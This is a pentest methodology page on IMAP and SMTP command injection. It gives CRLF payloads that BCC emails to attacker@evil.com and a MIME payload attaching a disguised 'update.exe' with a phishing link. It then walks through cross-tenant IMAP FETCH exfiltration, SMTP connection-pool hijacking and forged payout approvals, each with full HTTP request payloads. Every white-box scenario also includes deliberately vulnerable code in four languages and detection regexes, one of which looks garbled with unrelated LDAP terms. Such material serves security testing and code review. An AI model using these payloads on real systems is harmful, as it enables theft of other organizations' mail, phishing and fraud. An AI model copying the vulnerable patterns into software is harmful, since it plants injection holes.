# IMAP SMTP Injection

## Check List

## Methodology

### Black Box

#### Email field

{% stepper %}
{% step %}
Navigate to email-sending features such as `Contact Us`, `Support`, `Feedback`, `Send Message`, or Invite User forms It's like paths `/contact`, `/support`, `/feedback`, `/send-email`, or `/ask`
{% endstep %}

{% step %}
Fill in the input fields like `email`, `name`, `subject`, and `message` with normal values, then intercept the request using Burp Suite
{% endstep %}

{% step %}
Locate user-controlled fields in the intercepted request (`email=gupta@gmail.com`, `name=Bless, message=Hello`)
{% endstep %}

{% step %}
Inject CRLF (`%0d%0a` or `\r\n`) into any field to insert a new email header

```
email=gupta@gmail.com%0d%0abcc:attacker@evil.com
```
{% endstep %}

{% step %}
Forward the modified request and check your attacker-controlled inbox (`attacker@evil.com`). If you receive a copy of the email with the injected header, injection is confirmed and Look for `BCC`/`CC` in received mail
{% endstep %}

{% step %}
similar endpoints like `/notify`, `/share`, `/invite`, `/ticket`, or `/api/mail`
{% endstep %}
{% endstepper %}

***

#### Reflected In The Confirmation Email or Response

{% stepper %}
{% step %}
Navigate to any email-sending form such as Contact Us, Support, Feedback, Get in Touch, Send Message, or Report Issue
{% endstep %}

{% step %}
l in the form with normal values Then intercept the request using Burp Suite.\
Capture the full `POST/GET` request to `/contact` or `/send`
{% endstep %}

{% step %}
Check if the email field is reflected in the confirmation email or response. If yes, proceed to injection testing
{% endstep %}

{% step %}
Inject `CRLF + BCC` into the email field to receive a blind copy

```
email=victim@company.com%0d%0abcc:attacker@evil.com
```
{% endstep %}

{% step %}
Forward the request and check `attacker@evil.com` if you receive the email, injection confirmed
{% endstep %}

{% step %}
Try malware attachment injection using MIME boundaries

```http
email=victim@company.com%0d%0a
content-type:multipart/mixed; boundary="XYZ"%0d%0a
%0d%0a--XYZ%0d%0a
content-type:text/plain%0d%0a
Your account needs verification: https://evil.com%0d%0a
--XYZ%0d%0a
content-type:application/octet-stream; name="update.exe"%0d%0a
content-disposition:attachment; filename="update.exe"%0d%0a
[base64-encoded payload or dummy data]%0d%0a
--XYZ--
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Data Exfiltration via IMAP Command Pipeline Desynchronization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise CRM, Helpdesk, or Ticketing systems where inbound emails are automatically converted into support tickets or integrated into user workspaces
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Centralized Ingress Mailbox architecture. To avoid managing thousands of distinct IMAP credentials for individual customers, the SaaS platform utilizes a single, massive catch-all mailbox (e.g., `support-catchall@enterprise.tld`)
{% endstep %}

{% step %}
Investigate the "Tenant Routing" optimization. When an email arrives, an upstream mail flow rule injects a custom tracking header (e.g., `X-Tenant-Id: Org_A`)
{% endstep %}

{% step %}
Analyze the background IMAP worker that pulls emails from this centralized mailbox. Fetching the entire multi-gigabyte mailbox over IMAP and filtering it in memory would instantly trigger out-of-memory (OOM) exceptions
{% endstep %}

{% step %}
Discover the raw protocol optimization: To push the computational load onto the highly optimized Microsoft Exchange or Dovecot IMAP server, the developer abandons heavy, high-level IMAP libraries (which often abstract away complex multi-conditional searches). Instead, they establish a raw TCP socket and construct a native IMAP `SEARCH` command string
{% endstep %}

{% step %}
Locate the search execution logic. The worker queries the database for active tenant search filters (e.g., finding tickets by subject or sender) and interpolates these dynamically alongside the hardcoded `X-Tenant-Id` header restriction
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that because they are executing an application-layer search query rather than a database query, standard SQL-style injection is irrelevant. They implicitly trust that IMAP servers safely handle quoted string arguments and fail to sanitize Carriage Return Line Feed (`\r\n`) characters
{% endstep %}

{% step %}
Recognize the protocol mechanics: IMAP is a text-based protocol where commands are prefixed with an alphanumeric tag (e.g., `A01`) and terminated with `\r\n`
{% endstep %}

{% step %}
Authenticate to the CRM as a low-privilege user within `Tenant_A`
{% endstep %}

{% step %}
Create a custom support filter rule containing the IMAP pipeline desynchronization payload. Inject a closing quote, the `\r\n` terminator to end the `SEARCH` command, and a completely new, tagged IMAP command: `"\r\nA02 FETCH 1:* (BODY.PEEK[HEADER.FIELDS (Subject From)])\r\n`
{% endstep %}

{% step %}
The background worker evaluates your custom filter rule, interpolates it into the raw IMAP stream, and transmits the payload over the TCP socket
{% endstep %}

{% step %}
The IMAP server receives the payload. It executes the first `SEARCH` command, hits the injected `\r\n`, and immediately executes the attacker's newly injected `A02 FETCH` command against the centralized multi-tenant inbox
{% endstep %}

{% step %}
The background worker's parsing loop reads the asynchronous stream, captures the response to `A02`, and blindly maps the highly confidential emails of all other organizations into your local tenant's ticket dashboard

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:StreamWriter.*(?:WriteLine|WriteLineAsync)\s*\(\s*\$".*(?:SEARCH|FETCH|SELECT|STORE)|ImapClient.*Send.*\$"|NetworkStream.*Write.*SEARCH)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:PrintWriter.*println\s*\(.*(?:SEARCH|FETCH|SELECT).*"\s*\+|BufferedWriter.*write\s*\(.*SEARCH|socket\.getOutputStream\(\).*SEARCH)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:fwrite\s*\(\s*\$imapStream.*(?:SEARCH|FETCH|SELECT)|imap_.*\(|stream_socket_sendto\s*\(.*SEARCH)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:socket\.write\s*\(`.*(?:SEARCH|FETCH|SELECT).*\\\$\\{|client\.send\s*\(.*SEARCH|imap.*send\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
StreamWriter.*WriteLineAsync\(\\\$".*SEARCH\s+HEADER|NetworkStream.*Write.*SEARCH
```
{% endtab %}

{% tab title="Java" %}
```regexp
PrintWriter.*println\(\".*SEARCH.*\"\s*\+|socket\.write.*SEARCH
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fwrite\(\\$imapStream,\s*".*SEARCH
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.write\(`.*SEARCH.*\\\$\\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ImapPollingWorker : BackgroundService
{
    private readonly TcpClient _tcpClient;
    private readonly StreamWriter _writer;

    public async Task FetchTenantEmailsAsync(string tenantId, string customSubjectFilter)
    {
        // [1]
        // [2]
        var commandTag = $"A{Guid.NewGuid().ToString().Substring(0,4)}";

        // [3]
        // [4]
        var imapCommand = $"{commandTag} SEARCH HEADER X-Tenant-Id {tenantId} SUBJECT \"{customSubjectFilter}\" UNSEEN";
        
        await _writer.WriteLineAsync(imapCommand);
        await _writer.FlushAsync();

        var response = await ReadImapResponseAsync(commandTag);
        await _ticketProcessor.ProcessTicketsAsync(tenantId, response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class ImapPollingWorker {

    private Socket imapSocket;
    private PrintWriter writer;

    public void fetchTenantEmails(String tenantId, String customSubjectFilter) throws IOException {
        // [1]
        // [2]
        String commandTag = "A" + System.currentTimeMillis();

        // [3]
        // [4]
        String imapCommand = commandTag + " SEARCH HEADER X-Tenant-Id " + tenantId + " SUBJECT \"" + customSubjectFilter + "\" UNSEEN";
        
        writer.print(imapCommand + "\r\n");
        writer.flush();

        String response = readImapResponse(commandTag);
        ticketProcessor.processTickets(tenantId, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ImapPollingWorker 
{
    protected $imapStream;

    public function fetchTenantEmails(string $tenantId, string $customSubjectFilter): void 
    {
        // [1]
        // [2]
        $commandTag = "A" . bin2hex(random_bytes(2));

        // [3]
        // [4]
        $imapCommand = "{$commandTag} SEARCH HEADER X-Tenant-Id {$tenantId} SUBJECT \"{$customSubjectFilter}\" UNSEEN\r\n";
        
        fwrite($this->imapStream, $imapCommand);

        $response = $this->readImapResponse($commandTag);
        $this->ticketProcessor->processTickets($tenantId, $response);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ImapPollingWorker {
    static async fetchTenantEmails(tenantId, customSubjectFilter) {
        // [1]
        // [2]
        let commandTag = `A${Math.floor(Math.random() * 10000)}`;

        // [3]
        // [4]
        let imapCommand = `${commandTag} SEARCH HEADER X-Tenant-Id ${tenantId} SUBJECT "${customSubjectFilter}" UNSEEN\r\n`;
        
        imapSocket.write(imapCommand);

        let response = await readImapResponse(commandTag);
        await ticketProcessor.processTickets(tenantId, response);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The worker connects directly to the enterprise mail server using a raw TCP socket to bypass the overhead of heavy mail libraries during high-frequency polling, \[2] The system generates a dynamic command tag, a strict requirement of the IMAP protocol for asynchronous response mapping, \[3] The architecture relies entirely on the structural integrity of the `SEARCH` command string to isolate tenant data, assuming the `X-Tenant-Id` header acts as a cryptographic boundary, \[4] The fatal boundary collapse. The developer interpolates the user-controlled `customSubjectFilter` into double quotes. Because there is no sanitization of `\r\n`, the attacker can prematurely terminate the `SEARCH` query and inject arbitrary, tagged IMAP commands directly into the active, highly privileged mail stream

```http
// 1. Attacker (Tenant A) navigates to their Custom Ticket Filter settings.
// 2. Attacker configures the Subject Filter to contain the IMAP CRLF evasion payload.

POST /api/v1/settings/ticket-filters HTTP/1.1
Host: helpdesk.enterprise.tld
Authorization: Bearer <tenant_a_token>
Content-Type: application/json

{
  "filterName": "High Priority",
  "subjectMatch": "Urgent\"\r\nB999 FETCH 1:* (BODY.PEEK[])\r\nC001 SEARCH SUBJECT \"DUMMY"
}

// 3. The backend worker awakens, reads the filter, and blasts the raw payload to the Exchange Server:
// A123 SEARCH HEADER X-Tenant-Id Org_A SUBJECT "Urgent"
// B999 FETCH 1:* (BODY.PEEK[])
// C001 SEARCH SUBJECT "DUMMY" UNSEEN

// 4. The Exchange Server processes B999 and returns the entirety of the massive catch-all mailbox.
// 5. The worker parses the response stream and loads the cross-tenant emails into the attacker's dashboard.
```
{% endstep %}

{% step %}
To support complex, multi-tenant mail ingestion without relying on massive relational database syncs, developers engineered a centralized mailbox accessed via highly optimized raw IMAP queries. By utilizing string concatenation to dynamically filter tickets, they assumed IMAP was immune to injection vulnerabilities simply because it wasn't SQL. The attacker exploited this assumption by injecting IMAP command terminators (`\r\n`) within a legitimate filter property. The internal mail worker faithfully transmitted the stream. The corporate IMAP server interpreted the injected bytes as a discrete, sequential command (`FETCH 1:*`), bypassing the preceding tenant isolation search. The worker's asynchronous read loop captured the massive data dump, seamlessly migrating the highly classified emails of thousands of enterprise organizations directly into the attacker's isolated SaaS workspace
{% endstep %}
{% endstepper %}

***

#### Supply Chain Compromise via SMTP Connection Pool Desynchronization (BCC Hijacking)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on massive batch processing interfaces, automated report generation, and asynchronous notification pipelines (e.g., end-of-month financial exports, bulk invoice mailing)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Outbound Notification architecture. The microservice generates tens of thousands of emails concurrently
{% endstep %}

{% step %}
Investigate the network transmission bottleneck: Opening and tearing down a new TCP socket and executing the full SMTP `HELO/EHLO`, `STARTTLS`, and `AUTH` handshake for 50,000 distinct emails causes crippling latency and exhausts ephemeral ports on the internal network
{% endstep %}

{% step %}
Discover the "SMTP Pipelining" optimization. To achieve massive throughput, the backend engineer implements a persistent Connection Pool. A single TCP socket remains open to the internal Postfix/Exchange relay, and the application rapidly blasts `MAIL FROM`, `RCPT TO`, and `DATA` sequences sequentially into the open stream
{% endstep %}

{% step %}
Analyze the metadata injection logic within the batch loop. The application customizes the email delivery by injecting user-defined metadata (e.g., a custom `Reply-To` address, or a dynamic `Recipient Name` bound to the `To:` header) directly into the raw socket
{% endstep %}

{% step %}
Understand the structural trust failure: The developer assumes that user profile fields, such as a "Contact Name", are strictly display artifacts. They bypass standard mail builder libraries (which enforce RFC 5322 header folding and character limitations) to maximize string-builder performance
{% endstep %}

{% step %}
Formulate the TCP Desynchronization attack. If the attacker injects `\r\n` into the `Recipient Name` or custom metadata field, they can break out of the active SMTP header block or inject completely new SMTP commands into the active transaction
{% endstep %}

{% step %}
Identify the target sequence: The SMTP transaction executes `MAIL FROM: <...>`, then `RCPT TO: <...>`, then `DATA`
{% endstep %}

{% step %}
Update your organization's "Billing Contact Name" to contain a malicious `RCPT TO` injection payload: `Attacker\r\nRCPT TO:<attacker@evil.com>`
{% endstep %}

{% step %}
Trigger the nightly or monthly batch invoice generation process
{% endstep %}

{% step %}
The background worker iterates over the tenant list. It processes your tenant, writing `RCPT TO:<"Attacker\r\nRCPT TO:<attacker@evil.com>" <your@email.com>>` to the active socket
{% endstep %}

{% step %}
The internal SMTP relay parses the stream. It registers the first recipient, hits the `\r\n`, and registers your attacker email address as a _second_ recipient (BCC) for the current active email transaction
{% endstep %}

{% step %}
Crucially, if you inject the payload to break the _current_ `DATA` block and initiate a _new_ transaction entirely, you can desynchronize the connection pool. This allows you to silently BCC yourself on the subsequent emails processed by the worker on that same persistent TCP connection, intercepting other tenants' highly sensitive financial reports or password reset links in transit

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:smtpStream\.Write(?:Async)?\s*\(.*(?:RCPT TO:|MAIL FROM:)|SmtpClient.*Send|NetworkStream.*Write.*RCPT)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)\b(?:writer\.print(?:ln)?\s*\(\s*".*(?:RCPT TO:|MAIL FROM:)|PrintWriter.*RCPT TO:|socket\.getOutputStream\(\).*RCPT)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:fwrite\s*\(\s*\$smtpSocket.*(?:RCPT TO:|MAIL FROM:)|fsockopen.*smtp|stream_socket_sendto\s*\(.*RCPT)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:socket\.write\s*\(`(?:RCPT TO:|MAIL FROM:).*\\\$\\{|client\.write\s*\(.*RCPT TO:|net\.Socket.*write)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
smtpStream\.WriteAsync\(.*RCPT TO:|NetworkStream.*Write.*RCPT
```
{% endtab %}

{% tab title="Java" %}
```regexp
writer\.print\("RCPT TO:.*|PrintWriter.*RCPT TO:
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fwrite\(\\$smtpSocket,\s*".*RCPT TO:.*\\$user->
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.write\(`RCPT TO:\s*<.*\\\$\\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class BatchEmailWorker 
{
    private readonly NetworkStream _smtpStream;

    public async Task ProcessBatchAsync(List<InvoiceDto> invoices) 
    {
        foreach (var invoice in invoices) 
        {
            // [1]
            // [2]
            var mailFrom = Encoding.UTF8.GetBytes("MAIL FROM:<billing@enterprise.tld>\r\n");
            await _smtpStream.WriteAsync(mailFrom, 0, mailFrom.Length);

            // [3]
            // [4]
            var rcptTo = Encoding.UTF8.GetBytes($"RCPT TO:<\"{invoice.ContactName}\" <{invoice.ContactEmail}>>\r\n");
            await _smtpStream.WriteAsync(rcptTo, 0, rcptTo.Length);

            var dataCmd = Encoding.UTF8.GetBytes("DATA\r\n");
            await _smtpStream.WriteAsync(dataCmd, 0, dataCmd.Length);

            var payload = Encoding.UTF8.GetBytes($"Subject: Your Invoice\r\n\r\n{invoice.HtmlBody}\r\n.\r\n");
            await _smtpStream.WriteAsync(payload, 0, payload.Length);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class BatchEmailWorker {

    private OutputStream smtpStream;

    public void processBatch(List<InvoiceDto> invoices) throws IOException {
        for (InvoiceDto invoice : invoices) {
            // [1]
            // [2]
            smtpStream.write("MAIL FROM:<billing@enterprise.tld>\r\n".getBytes());

            // [3]
            // [4]
            String rcptTo = "RCPT TO:<\"" + invoice.getContactName() + "\" <" + invoice.getContactEmail() + ">>\r\n";
            smtpStream.write(rcptTo.getBytes());

            smtpStream.write("DATA\r\n".getBytes());

            String payload = "Subject: Your Invoice\r\n\r\n" + invoice.getHtmlBody() + "\r\n.\r\n";
            smtpStream.write(payload.getBytes());
        }
        smtpStream.flush();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class BatchEmailWorker 
{
    protected $smtpSocket;

    public function processBatch(array $invoices): void 
    {
        foreach ($invoices as $invoice) 
        {
            // [1]
            // [2]
            fwrite($this->smtpSocket, "MAIL FROM:<billing@enterprise.tld>\r\n");

            // [3]
            // [4]
            $rcptTo = "RCPT TO:<\"{$invoice->contactName}\" <{$invoice->contactEmail}>>\r\n";
            fwrite($this->smtpSocket, $rcptTo);

            fwrite($this->smtpSocket, "DATA\r\n");

            $payload = "Subject: Your Invoice\r\n\r\n{$invoice->htmlBody}\r\n.\r\n";
            fwrite($this->smtpSocket, $payload);
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class BatchEmailWorker {
    static async processBatch(invoices) {
        for (let invoice of invoices) {
            // [1]
            // [2]
            smtpSocket.write("MAIL FROM:<billing@enterprise.tld>\r\n");

            // [3]
            // [4]
            let rcptTo = `RCPT TO:<"${invoice.contactName}" <${invoice.contactEmail}>>\r\n`;
            smtpSocket.write(rcptTo);

            smtpSocket.write("DATA\r\n");

            let payload = `Subject: Your Invoice\r\n\r\n${invoice.htmlBody}\r\n.\r\n`;
            smtpSocket.write(payload);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes millions of emails sequentially over a single, long-lived TCP socket, actively optimizing out the cryptographic handshake and authentication latency of opening new connections, \[2] The backend writes directly to the network stream using byte arrays or raw string primitives, intentionally bypassing standardized mail APIs (which carry heavy object allocation costs) to achieve maximum throughput, \[3] The architecture retrieves the target's Contact Name from the database to personalize the recipient field, \[4] The fatal boundary collapse. The worker interpolates the unstructured Contact Name directly into the strict protocol command. By failing to strip or URL-encode the `\r\n` sequence, the attacker dictates the chronological state machine of the SMTP relay. The injected `RCPT TO` command seamlessly registers a phantom recipient within the active transactional context

```http
// 1. Attacker (Tenant A) updates their organizational billing profile.
// They inject the CRLF payload designed to BCC themselves on the ACTIVE transaction.
PUT /api/v1/billing/profile HTTP/1.1
Host: portal.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "contactName": "Attacker\"\r\nRCPT TO:<attacker@evil.com>",
  "contactEmail": "billing@attacker.tld"
}

// 2. The Month-End billing process executes.
// 3. The worker writes the attacker's payload to the TCP socket:
// MAIL FROM:<billing@enterprise.tld>
// RCPT TO:<"Attacker"
// RCPT TO:<attacker@evil.com>" <billing@attacker.tld>>

// 4. The Internal SMTP Relay interprets two completely separate RCPT TO commands.
// 5. To escalate this to intercepting OTHER tenants, the attacker injects a state-desynchronization payload:
// "\r\nDATA\r\nSubject: Desynced\r\n\r\nGarbage\r\n.\r\nMAIL FROM:<billing@enterprise.tld>\r\nRCPT TO:<attacker@evil.com>

// 6. The subsequent tenant's data is written to the active socket, and is inadvertently routed 
// entirely to the attacker's newly injected transaction envelope.
```
{% endstep %}

{% step %}
To fulfill massive SLA requirements for end-of-month reporting, engineers designed an asynchronous batch-mailing pipeline. They abandoned slow, high-level object-oriented mail clients in favor of pipelining raw strings over a persistent TCP socket directly to the internal Postfix relay. They blindly trusted the semantic safety of standard database string fields. The attacker exploited this operational assumption by injecting raw SMTP protocol terminators (`\r\n`) into a localized display field. When the loop processed the batch, it streamed the attacker's payload into the socket. The internal SMTP relay parsed the stream, executed the injected recipient directives, and permanently desynchronized the execution state. The attacker successfully hijacked the connection pool, instructing the internal relay to actively carbon-copy the highly classified financial documents of arbitrary cross-tenant victims directly to an external, attacker-controlled domain
{% endstep %}
{% endstepper %}

***

#### Internal Workflow Bypass via SMTP Envelope Spoofing in Email-to-Action Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous business processes, specifically zero-trust architectures utilizing "Email-to-Action" features (e.g., replying "APPROVE" to an email to authorize a pull request, release funds, or escalate a Jira ticket)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Variable Envelope Return Path (VERP) architecture. When an enterprise platform dispatches an actionable email to a user, it dynamically generates a unique `Return-Path` (e.g., `action+tenant99+invoice77@internal.corp`) so the backend mail parser can cryptographically map the user's eventual reply back to the specific database record
{% endstep %}

{% step %}
Investigate the internal service responsible for generating these VERP dispatch emails
{% endstep %}

{% step %}
Observe the "Internal Mesh Trust" optimization. Because the microservice is deployed deeply within an internal, firewalled Kubernetes cluster, it does not connect to an external Mailgun or SendGrid API. Instead, it connects via raw TCP to a local, unauthenticated SMTP sidecar proxy (`smtp-relay.internal.svc`)
{% endstep %}

{% step %}
Analyze the VERP construction logic. The backend retrieves the `CampaignId` or `InvoiceId` from the frontend HTTP request and interpolates it directly into the `MAIL FROM:` SMTP command to establish the bounce/reply path
{% endstep %}

{% step %}
Discover the critical architectural disconnect: The downstream internal Workflow Engine (which processes the inbound approvals) implicitly trusts any email originating from the `smtp-relay.internal.svc` IP address. If it receives a correctly formatted approval payload, it executes the high-privilege action
{% endstep %}

{% step %}
Formulate the SMTP Injection workflow bypass. You do not need to attack an external user; you need to leverage the internal notification service to send an authoritative email _to_ the internal Workflow Engine
{% endstep %}

{% step %}
Send a request to trigger the notification service (e.g., generating a standard alert or password reset)
{% endstep %}

{% step %}
Inject an SMTP Command pipeline payload into the `InvoiceId` or `CampaignId` parameter
{% endstep %}

{% step %}
The payload must gracefully close the current `MAIL FROM` envelope, define a new `RCPT TO` pointing exclusively to the internal Workflow Parser (e.g., `approve-action@internal.corp`), and provide a spoofed `DATA` block containing the mandatory approval syntax (e.g., `Action: APPROVE\nTarget: Attacker`)
{% endstep %}

{% step %}
The internal notification service receives the payload, fails to strip the `\r\n` characters, and transmits the string to the local SMTP sidecar
{% endstep %}

{% step %}
The sidecar proxy processes the attacker's injected SMTP transaction. Because the proxy operates inside the trusted mesh, it successfully routes the spoofed email to the internal Workflow Engine
{% endstep %}

{% step %}
The Workflow Engine parses the email, verifies the trusted internal origin IP, processes the `APPROVE` directive, and executes the highly privileged state mutation, entirely bypassing the cryptographic intent of the Zero-Trust mesh

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Socket.*Write.*"MAIL FROM:<.*"|stream.*Write.*MAIL FROM:|Smtp.*MAIL FROM)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:stream\.print(?:ln)?\s*\(\s*"MAIL FROM:<.*|PrintWriter.*MAIL FROM:|socket.*write.*MAIL FROM)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:fwrite\s*\(\s*\$socket.*MAIL FROM:<.*|fsockopen.*MAIL FROM)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:socket\.write\s*\(`MAIL FROM:<.*\\\$\\{|socket\.send\s*\(.*MAIL FROM)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Socket.*Write.*\"MAIL FROM:<.*|stream.*Write.*MAIL FROM:
```
{% endtab %}

{% tab title="Java" %}
```regexp
stream\.print\(\"MAIL FROM:<.*|PrintWriter.*MAIL FROM:
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fwrite\(\\$socket,\s*\"MAIL FROM:<.*\\$invoiceId
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.write\(`MAIL FROM:<.*\\\$\\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class NotificationDispatchService 
{
    private readonly TcpClient _internalSmtpSidecar;

    public async Task DispatchActionableAlertAsync(string userEmail, string invoiceId) 
    {
        var stream = _internalSmtpSidecar.GetStream();

        // [1]
        // [2]
        // [3]
        var mailFrom = Encoding.UTF8.GetBytes($"MAIL FROM:<action+{invoiceId}@internal.corp>\r\n");
        await stream.WriteAsync(mailFrom, 0, mailFrom.Length);

        // [4]
        var rcptTo = Encoding.UTF8.GetBytes($"RCPT TO:<{userEmail}>\r\n");
        await stream.WriteAsync(rcptTo, 0, rcptTo.Length);

        var dataCmd = Encoding.UTF8.GetBytes("DATA\r\n");
        await stream.WriteAsync(dataCmd, 0, dataCmd.Length);

        var payload = Encoding.UTF8.GetBytes("Subject: Action Required\r\n\r\nPlease review.\r\n.\r\n");
        await stream.WriteAsync(payload, 0, payload.Length);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class NotificationDispatchService {

    private Socket internalSmtpSidecar;

    public void dispatchActionableAlert(String userEmail, String invoiceId) throws IOException {
        PrintWriter stream = new PrintWriter(internalSmtpSidecar.getOutputStream(), true);

        // [1]
        // [2]
        // [3]
        stream.print("MAIL FROM:<action+" + invoiceId + "@internal.corp>\r\n");
        
        // [4]
        stream.print("RCPT TO:<" + userEmail + ">\r\n");
        
        stream.print("DATA\r\n");
        stream.print("Subject: Action Required\r\n\r\nPlease review.\r\n.\r\n");
        stream.flush();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class NotificationDispatchService 
{
    protected $internalSmtpSidecar;

    public function dispatchActionableAlert(string $userEmail, string $invoiceId): void 
    {
        // [1]
        // [2]
        // [3]
        fwrite($this->internalSmtpSidecar, "MAIL FROM:<action+{$invoiceId}@internal.corp>\r\n");

        // [4]
        fwrite($this->internalSmtpSidecar, "RCPT TO:<{$userEmail}>\r\n");
        
        fwrite($this->internalSmtpSidecar, "DATA\r\n");
        fwrite($this->internalSmtpSidecar, "Subject: Action Required\r\n\r\nPlease review.\r\n.\r\n");
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class NotificationDispatchService {
    static async dispatchActionableAlert(userEmail, invoiceId) {
        // [1]
        // [2]
        // [3]
        internalSmtpSidecar.write(`MAIL FROM:<action+${invoiceId}@internal.corp>\r\n`);

        // [4]
        internalSmtpSidecar.write(`RCPT TO:<${userEmail}>\r\n`);
        
        internalSmtpSidecar.write("DATA\r\n");
        internalSmtpSidecar.write("Subject: Action Required\r\n\r\nPlease review.\r\n.\r\n");
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The microservice operates entirely within an internal Kubernetes mesh. To offload SMTP complexity, it delegates transmission to a local, unauthenticated Postfix sidecar, \[2] The backend orchestrates a Variable Envelope Return Path (VERP) architecture to perfectly correlate asynchronous user email replies back to the exact database entity requiring approval, \[3] The architecture intrinsically assumes that input identifiers (like `invoiceId`) are securely generated UUIDs or integers, failing to enforce a rigid alphanumeric regex before interpolation, \[4] The execution sink. The raw string is dumped into the active TCP socket. By injecting `\r\n`, the attacker intercepts the command pipeline. Instead of allowing the system to send an email to the user, the attacker explicitly overrides the `RCPT TO` envelope, transforming the notification microservice into a highly authoritative internal forgery engine

```http
// 1. Attacker leverages the public API to trigger a seemingly benign action (e.g., requesting a copy of an invoice).
// 2. Attacker injects the SMTP Desynchronization payload into the InvoiceID field.
// The payload closes the MAIL FROM, specifies the internal Workflow Parser as the recipient, 
// and injects a spoofed DATA block authorizing the release of funds.

POST /api/v1/invoices/resend HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "invoiceId": "999>\r\nRCPT TO:<workflow-engine@internal.corp>\r\nDATA\r\nSubject: Invoice Approval\r\n\r\nAUTHORIZE_PAYOUT_TO_ATTACKER\r\n.\r\nMAIL FROM:<action+"
}

// 3. The Backend Microservice receives the payload and writes it to the internal SMTP sidecar:
// MAIL FROM:<action+999>
// RCPT TO:<workflow-engine@internal.corp>
// DATA
// Subject: Invoice Approval
// 
// AUTHORIZE_PAYOUT_TO_ATTACKER
// .
// MAIL FROM:<action+@internal.corp>

// 4. The sidecar proxy processes the first transaction perfectly, delivering the authoritative payload 
// to the internal workflow engine, bypassing all physical and logical network separation.
```
{% endstep %}

{% step %}
To construct a seamless "Email-to-Action" user experience, architects embedded dynamic routing artifacts directly into the SMTP envelope. By shifting SMTP transmission to an unauthenticated internal sidecar proxy, they optimized inter-service communication but entirely localized the perimeter trust boundary. The backend microservice blindly interpolated an untrusted identifier into the socket stream. The attacker exploited this assumption by injecting SMTP terminators (`\r\n`) within the `InvoiceId` field. The internal sidecar processed the injected commands natively. Instead of dispatching an outbound email, the notification service inadvertently forged an internal email and routed it directly to the protected Workflow Engine. The Workflow Engine consumed the spoofed approval payload, verified the trusted origin IP of the internal sidecar, and executed the unauthenticated financial payout, completely subverting the Zero-Trust mesh topology
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
